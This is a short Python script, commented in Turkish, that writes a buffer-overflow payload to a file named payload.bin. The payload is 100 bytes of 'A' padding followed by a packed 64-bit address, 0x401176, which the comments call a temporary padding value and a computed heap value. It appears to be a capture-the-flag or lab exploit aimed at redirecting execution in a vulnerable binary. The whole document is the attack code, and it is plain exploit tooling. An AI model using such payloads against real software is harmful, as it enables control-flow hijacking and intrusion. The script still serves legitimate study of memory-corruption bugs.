import struct
PADDING_SIZE = 100 # Geçici değer
TARGET_ADDRESS = 0x401176 # Hesaplanan Heap Değeri
payload = b'A' * PADDING_SIZE + struct.pack("<Q", TARGET_ADDRESS)
with open("payload.bin", "wb") as f: f.write(payload)
print("'payload.bin' oluşturuldu.")
